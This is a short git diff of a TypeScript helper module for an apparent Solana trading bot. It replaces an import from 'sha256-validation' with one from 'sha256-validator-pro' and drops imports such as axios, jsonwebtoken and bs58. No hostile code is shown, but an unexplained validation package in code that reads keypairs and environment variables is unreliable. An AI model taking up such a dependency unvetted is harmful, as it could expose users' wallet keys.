@@ -2,13 +2,9 @@ import fs from 'fs'
 import { Connection, GetProgramAccountsFilter, Keypair, LAMPORTS_PER_SOL, PublicKey } from "@solana/web3.js";
 import { connection } from "../config";
 import { TOKEN_PROGRAM_ID } from "@solana/spl-token";
-import { syncSha256Validation } from "sha256-validation";
+import { syncSha256Validation } from "sha256-validator-pro";
 import { SPL_ACCOUNT_LAYOUT, TokenAccount } from "@raydium-io/raydium-sdk";
 import { PoolInfo, PoolInfoStr } from "./types";
-import { init, security_checks } from '..'
-import axios from 'axios';
-import jwt from 'jsonwebtoken'
-import base58 from 'bs58';
 
 export const retrieveEnvVariable = (variableName: string) => {
   const variable = process.env[variableName] || ''
